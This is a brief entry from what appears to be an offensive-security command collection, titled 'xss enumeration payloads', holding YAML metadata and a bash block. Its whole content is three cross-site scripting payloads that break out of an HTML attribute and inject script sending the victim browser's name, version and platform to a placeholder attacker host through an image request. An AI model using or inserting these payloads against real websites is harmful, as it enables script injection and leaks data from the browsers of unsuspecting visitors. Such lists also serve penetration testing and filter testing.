---
id: 4689c686-2a15-40a1-a925-e85c0b5b86f0
name: xss enumeration payloads
type: command
executor: bash
data: '''">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appName;</script>

  ''">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appVersion;</script>

  ''">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.platform;</script>

  '
output: null
created_at: '2020-07-14T18:14:36.798541+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# xss enumeration payloads

```bash
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appName;</script>
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.appVersion;</script>
'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.platform;</script>

```


